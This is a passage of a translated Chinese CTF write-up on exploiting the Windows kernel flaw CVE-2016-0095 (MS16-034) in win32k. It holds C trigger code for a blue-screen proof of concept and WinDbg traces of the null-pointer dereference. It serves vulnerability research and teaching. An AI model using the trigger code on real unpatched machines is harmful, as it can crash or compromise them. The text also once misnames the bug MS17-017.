# 【CTF 攻略】SSCTF pwn450 Windows Kernel Exploitation Writeup
|
##### 译文声明
本文是翻译文章，文章来源：whereisk0shl.top
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
**传送门**
* * *
[**第三届 SSCTF 全国网络安全大赛—线上赛圆满结束！**](http://bobao.360.cn/ctf/activity/421.html)
[**【CTF 攻略】第三届 SSCTF 全国网络安全大赛—线上赛
Writeup**](http://bobao.360.cn/ctf/detail/195.html) **  
**
**前言**
* * *
刚刚结束的SSCTF里面出了很多贴近实战的题目，有JAVA沙箱逃逸，有office的栈溢出，都比较有意思，这次的pwn450的题目是一道Windows
Kernel
Exploitation，漏洞编号是CVE-2016-0095（MS16-034），由四叶草的大牛bee13oy提供了一个能触发BSOD的PoC，要求通过分析漏洞并在Win
7环境下完成利用。
感觉这个过程比较有意思，和师傅们分享一下，这个漏洞相对于之前做过的CVE-2014-4113漏洞来说更为简单，利用上也有点意思，适合做Windows
Kernel入门。
本文首先我们简单分析一下PoC，随后我们一起来分析一下这个漏洞的形成原因，最后我们来看一下这个漏洞的利用点在哪里并完成利用，文章最后我将CVE-2016-0095的EoP源码上传到github并提供链接。
另外bee13oy大牛提供的PoC，我在VS2013下编译有一点问题，我稍微调整了一下PoC源码，会一起上传至github。
调试环境按照SSCTF题目要求是Windows 7 x86 sp1. 请师傅们多多指教，谢谢阅读！
**PoC分析**
* * *
首先触发MS17-017的核心函数在Trigger_BSoDPoc中。
        HRGN hRgn = (HRGN)CreateRectRgnIndirect(&rect);
        HDC hdc = (HDC)CreateCompatibleDC((HDC)0x0);
        SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);
        HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)0x00edfc13);
        FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);
这个漏洞和bitmap相关，创建了一个hdc设备句柄，并选入了一个bitmap对象，创建了一个hBrush逻辑刷子，以及一个hRgn矩形对象，最后调用FillRgn触发漏洞。
其中SelectObject选入bitmap对象的hBitmap2，由NtGdiSetBitmapAttributes函数创建，其定义的bitmap结构在demo_CreateBitmapIndirect函数中。
PoC在VS2013编译时存在一些小问题，首先是对NtGdiSetBitmapAttributes的重构定义中使用的W32KAPI，这里编译时报错，增加一个预定义头就可以了。
    #ifndef W32KAPI
    #define W32KAPI  DECLSPEC_ADDRSAFE
    #endif
第二个问题在重构NtGdiSetBitmapAttributes时内联汇编会使用NtGdiSetBitmapAttributes的系统调用号，随后调用KiFastSystemCall进入内核态，这里KiFastSystemCall没有提供地址，可以直接在函数内LoadLibrary之后使用GetProcAddress获取KiFastSystemCall地址。
        HMODULE _H_NTDLL = NULL;
        PVOID addr_kifastsystemcall = NULL;
        _H_NTDLL = LoadLibrary(TEXT("ntdll.dll"));
        addr_kifastsystemcall = (PVOID)GetProcAddress(_H_NTDLL, "KiFastSystemCall");
        __asm
        {
            push argv1;
            push argv0;
            push 0x00;
            mov eax, eSyscall_NtGdiSetBitmapAttributes;
            mov edx, addr_kifastsystemcall;
            call edx;
            add esp, 0x0c;
        }
这样编译就没问题啦，PoC我们简单分析了一下，下面我们通过Windbg的PIPE进行双机联调，来分析一下这个漏洞的形成原因。
**MS16-034漏洞分析**
* * *
这是一个由于_SURFOBJ->hDEV未初始化直接引用导致的无效地址访问引发的漏洞，首先运行PoC，Windbg会捕获到异常中断，来看一下中断位置。
    kd> r
    eax=00000000 ebx=980b0af8 ecx=00000001 edx=00000000 esi=00000000 edi=fe9950d8
    eip=838b0560 esp=980b0928 ebp=980b09a0 iopl=0         nv up ei pl zr na pe nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
    win32k!bGetRealizedBrush+0x38:
    838b0560 f6402401        test    byte ptr [eax+24h],1       ds:0023:00000024=??
中断位置eax的值是0x0，而eax+24是一个无效地址空间，我们需要跟踪这个eax寄存器的值由什么地方得到，首先分析win32k!bGetRealizedBrush函数。
    int __stdcall bGetRealizedBrush(struct BRUSH *a1, struct EBRUSHOBJ *a2, int (__stdcall *a3)(struct _BRUSHOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _XLATEOBJ *, unsigned __int32))
    {
函数传入了3个变量，由外层函数分析，可以发现其中a3是EngRealizeBrush函数，是一个写死的值（这点后
面会提到），a1是一个BRUSH结构体，a2是一个EBRUSHOBJ结构体，而漏洞触发位置的eax就由EBRUSHOBJ结构体得来，跟踪分析一下这个过程。
    kd> p
    win32k!bGetRealizedBrush+0x1c://ebx由第二个参数得来
    969e0544 8b5d0c          mov     ebx,dword ptr [ebp+0Ch]
    ……
    kd> p
    win32k!bGetRealizedBrush+0x25://第二个参数+34h的位置的值交给eax
    969e054d 8b4334          mov     eax,dword ptr [ebx+34h]
    ……
    kd> p
    win32k!bGetRealizedBrush+0x32://eax+1c的值，交给eax，这个值为0
    969e055a 8b401c          mov     eax,dword ptr [eax+1Ch]
    kd> p
    win32k!bGetRealizedBrush+0x35:
    969e055d 89450c          mov     dword ptr [ebp+0Ch],eax
    kd> p
    win32k!bGetRealizedBrush+0x38://eax为0，引发无效内存访问
    969e0560 f6402401        test    byte ptr [eax+24h],1
经过上面的分析，我们需要知道，EBRUSHOBJ+34h位置存放着什么样的值，直接来看EBRUSHOBJ结构体的内容。
    kd> dd 8effcaf8
    8effcaf8  ffffffff 00000000 00000000 00edfc13
    8effcb08  00edfc13 00000000 00000006 00000004
    8effcb18  00000000 00ffffff fe96b7c4 00000000
    8effcb28  00000000 fd2842e8 ffbff968 ffbffe68
这里0x8effcaf8+34h位置存放的值是fd2842e8，而fd2842e8+1c存放的是0x0，就是这里传递给eax，导致了eax是0x0，从而引发了无效地址访问。
    kd> dd fd2842e8
    fd2842e8  108501ef 00000001 80000000 874635f8
    fd2842f8  00000000 108501ef 00000000 00000000
    fd284308  00000008 00000008 00000020 fd28443c
    fd284318  fd28443c 00000004 00001292 00000001
因此我们需要知道fd2842e8＋1c是一个什么对象的值，但通过dt方法没法获得_EBRUSHOBJ的结构，这里对象不明朗没关系，我们可以通过对外层函数的跟踪，来看一下+1c位置存放的是什么样的结构，通过kb堆栈回溯（这里由于多次重启堆栈地址发生变化，不影响调试）
    kd> kb
     # ChildEBP RetAddr  Args to Child              
    00 980b09a0 838b34af 00000000 00000000 838ad5a0 win32k!bGetRealizedBrush+0x38
    01 980b09b8 83929b5e 980b0af8 00000001 980b0a7c win32k!pvGetEngRbrush+0x1f
    02 980b0a1c 839ab6e8 fe975218 00000000 00000000 win32k!EngBitBlt+0x337
    03 980b0a54 839abb9d fe975218 980b0a7c 980b0af8 win32k!EngPaint+0x51
    04 980b0c20 83e941ea 00000000 ffbff968 1910076b win32k!NtGdiFillRgn+0x339
我们可以看到最外层函数调用了win32k!NtGdiFillRgn函数，直接跟踪外层函数调用，在NtGdiFillRgn函数中。
                EngPaint(
                  (struct _SURFOBJ *)(v5 + 16),
                  (int)&v13,
                  (struct _BRUSHOBJ *)&v18,
                  (struct _POINTL *)(v42 + 1592),
                  v10);                             // 函数调用会进这里
接下来我们重启系统，重新跟踪这个过程，对象地址值发生变化，但不影响调试，传入的第一个参数是SURFOBJ对象，来看一下这个对象的内容